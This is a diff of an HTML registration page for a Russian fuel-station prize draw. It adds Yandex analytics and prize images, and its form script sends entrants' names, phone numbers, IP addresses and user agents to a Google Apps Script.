@@ -5,8 +5,30 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <title>Розыгрыш Xoil — iPhone 17 и другие призы | Регистрация участника</title>
     <meta name="description" content="Розыгрыш от сети АЗС Xoil: iPhone 17, наборы инструментов, компрессоры и бесплатный бензин. Зарегистрируйся и участвуй!">
+    
+    <!-- Яндекс Вебмастер -->
+    <meta name="yandex-verification" content="3d630d1a3ff9911c" />
+    
+    <!-- Favicon для вкладки браузера (logs.png) -->
+    <link rel="icon" type="image/png" sizes="160x160" href="logs.png">
+    <link rel="apple-touch-icon" sizes="160x160" href="logs.png">
+    
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    
+    <!-- Яндекс Метрика -->
+    <script type="text/javascript">
+        (function(m,e,t,r,i,k,a){
+            m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+            m[i].l=1*new Date();
+            for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
+            k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)
+        })(window, document,'script','https://mc.yandex.ru/metrika/tag.js?id=108740947', 'ym');
+
+        ym(108740947, 'init', {ssr:true, webvisor:true, clickmap:true, ecommerce:"dataLayer", referrer: document.referrer, url: location.href, accurateTrackBounce:true, trackLinks:true});
+    </script>
+    <noscript><div><img src="https://mc.yandex.ru/watch/108740947" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+    
     <style>
         * {
             margin: 0;
@@ -41,7 +63,7 @@
             gap: 16px;
         }
         .logo-img {
-            height: 44px;
+            height: 40px;
             width: auto;
             display: block;
         }
@@ -90,16 +112,16 @@
         .prize-grid {
             display: flex;
             justify-content: center;
-            gap: 30px;
+            gap: 24px;
             flex-wrap: wrap;
             margin: 40px 0;
         }
         .prize-card {
             background: rgba(10, 10, 0, 0.8);
-            border: 1px solid rgba(255, 215, 0, 0.3);
-            border-radius: 28px;
-            padding: 24px;
-            width: 220px;
+            border: 1px solid rgba(255, 215, 0, 0.2);
+            border-radius: 20px;
+            padding: 20px;
+            width: 150px;
             text-align: center;
             transition: 0.3s;
         }
@@ -107,15 +129,21 @@
             border-color: #FFD700;
             transform: translateY(-5px);
         }
-        .prize-icon {
-            font-size: 48px;
-            color: #FFD700;
-            margin-bottom: 16px;
+        .prize-img {
+            width: 70px;
+            height: 70px;
+            object-fit: contain;
+            margin-bottom: 12px;
         }
         .prize-place {
-            font-size: 24px;
-            font-weight: 800;
+            font-size: 12px;
+            font-weight: 600;
             color: #FFD700;
+            margin-bottom: 4px;
+        }
+        .prize-name {
+            font-size: 13px;
+            font-weight: 500;
         }
         .form-card {
             background: #050505;
@@ -246,7 +274,8 @@
         }
         @media (max-width: 768px) {
             .hero-title { font-size: 32px; }
-            .prize-card { width: 160px; padding: 16px; }
+            .prize-card { width: 130px; padding: 16px; }
+            .prize-img { width: 50px; height: 50px; }
             .form-row { grid-template-columns: 1fr; gap: 0; }
         }
     </style>
@@ -256,7 +285,7 @@
 <header class="header">
     <div class="container header-inner">
         <div class="logo-area">
-            <img src="l.png" alt="Xoil" class="logo-img" onerror="this.src='https://placehold.co/44x44?text=Xoil'">
+            <img src="l.png" alt="Xoil" class="logo-img" onerror="this.src='https://placehold.co/40x40?text=Xoil'">
         </div>
         <nav class="nav-menu">
             <a href="index.html" class="nav-link">Главная</a>
@@ -274,12 +303,28 @@
         <h1 class="hero-title">🎲 Розыгрыш Xoil</h1>
         <p style="font-size: 20px; opacity: 0.9;">Заполните форму и введите код с чека, чтобы участвовать в розыгрыше <strong style="color:#FFD700;">iPhone 17</strong> и других призов!</p>
         
-        <!-- Призы -->
+        <!-- Призы с картинками 1.png, 2.png, 3.png, 4.png -->
         <div class="prize-grid">
-            <div class="prize-card"><div class="prize-icon">📱</div><div class="prize-place">1 место</div><strong>iPhone 17</strong></div>
-            <div class="prize-card"><div class="prize-icon">🧰</div><div class="prize-place">2-6 места</div>Набор инструментов</div>
-            <div class="prize-card"><div class="prize-icon">🔧</div><div class="prize-place">7-16 места</div>Компрессор автомобильный</div>
-            <div class="prize-card"><div class="prize-icon">⛽</div><div class="prize-place">17-20 места</div>Бензин 20л бесплатно</div>
+            <div class="prize-card">
+                <img src="1.png" alt="iPhone 17" class="prize-img" onerror="this.src='https://placehold.co/70x70?text=📱'">
+                <div class="prize-place">1 место</div>
+                <div class="prize-name">iPhone 17</div>
+            </div>
+            <div class="prize-card">
+                <img src="2.png" alt="Набор инструментов" class="prize-img" onerror="this.src='https://placehold.co/70x70?text=🧰'">
+                <div class="prize-place">2-6 места</div>
+                <div class="prize-name">Набор инструментов</div>
+            </div>
+            <div class="prize-card">
+                <img src="3.png" alt="Компрессор" class="prize-img" onerror="this.src='https://placehold.co/70x70?text=🔧'">
+                <div class="prize-place">7-16 места</div>
+                <div class="prize-name">Компрессор</div>
+            </div>
+            <div class="prize-card">
+                <img src="4.png" alt="Бензин 20л" class="prize-img" onerror="this.src='https://placehold.co/70x70?text=⛽'">
+                <div class="prize-place">17-20 места</div>
+                <div class="prize-name">Бензин 20л</div>
+            </div>
         </div>
         
         <!-- Форма регистрации -->
@@ -337,13 +382,11 @@
     // ========================
     // НАСТРОЙКА GOOGLE SCRIPT
     // ========================
-    // 🔥 ВСТАВЬТЕ ВАШ URL СЮДА (из Apps Script)
     const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwRi8SMSx520prvHiwTB7g5j_ZUAG6pCQkAKLO8kJdZwWvf_f3pNgXyT2WDVHbAkkjrwQ/exec';
     
     const form = document.getElementById('registerForm');
     const msgDiv = document.getElementById('formMessage');
     
-    // Валидация телефона
     function validatePhone(phone) {
         const digits = phone.replace(/\D/g, '');
         return digits.length >= 10 && digits.length <= 12;
@@ -385,7 +428,6 @@
         const now = new Date();
         const registrationDate = now.toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
         
-        // Получаем IP через бесплатный API
         let userIP = 'IP не определён';
         try {
             const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -397,7 +439,6 @@
         
         const userAgent = navigator.userAgent;
         
-        // Формируем URL с параметрами для JSONP
         const params = new URLSearchParams();
         params.append('callback', 'jsonp_callback');
         params.append('firstName', firstName);
@@ -409,7 +450,6 @@
         params.append('userAgent', userAgent);
         params.append('timestamp', now.getTime());
         
-        // Создаём уникальный callback
         const callbackName = 'jsonp_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
         
         window[callbackName] = function(response) {
@@ -430,12 +470,10 @@
             submitBtn.disabled = false;
         };
         
-        // Создаём JSONP скрипт
         const script = document.createElement('script');
         script.src = GOOGLE_SCRIPT_URL + '?' + params.toString().replace('callback=jsonp_callback', 'callback=' + callbackName);
         document.body.appendChild(script);
         
-        // Таймаут на случай ошибки
         setTimeout(() => {
             if (window[callbackName]) {
                 window[callbackName]({ result: 'error', error: 'Превышено время ожидания. Проверьте интернет-соединение.' });
@@ -453,7 +491,6 @@
         }, 6000);
     }
     
-    // Маска для телефона
     const phoneInput = document.getElementById('phone');
     phoneInput.addEventListener('input', function(e) {
         let value = e.target.value.replace(/\D/g, '');
